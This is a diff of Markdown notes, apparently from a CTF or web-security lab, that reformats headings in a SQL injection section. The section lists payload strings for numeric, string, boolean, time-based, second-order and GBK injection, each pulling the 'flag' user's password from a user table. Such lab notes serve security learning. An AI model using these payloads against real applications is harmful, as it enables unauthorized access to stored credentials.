@@ -25,11 +25,12 @@ Progress
 - [ ]  XXE?
 
 <hr />
-## SQL Injection ##
 
-### Payload ###
+# SQL Injection #
 
-* 数字型注入: ``1 union select password from user where username='flag'#``
+## Payload ##
+
+* 数字型注入: ``0 union select password from user where username='flag'#``
 * 字符型注入：``0' union select password from user where username='flag'#``
 * 布尔注入：``1'^(ascii(substr((select password from user where username='flag'),1,1))>0)#``
 * 时间注入：``1' union select (ascii(substr((select password from user where username='flag'),1,1))>0) and sleep(1)#``
@@ -38,7 +39,7 @@ Progress
 * 二次注入：``1' union select password from user where username=0x666c6167#``
 * GBK注入：``0�' union select password from user where username=0x666c6167#``
 
-### 总结 ###
+## 总结 ##
 
 MySQL本身的数字包含字符类型
 ```
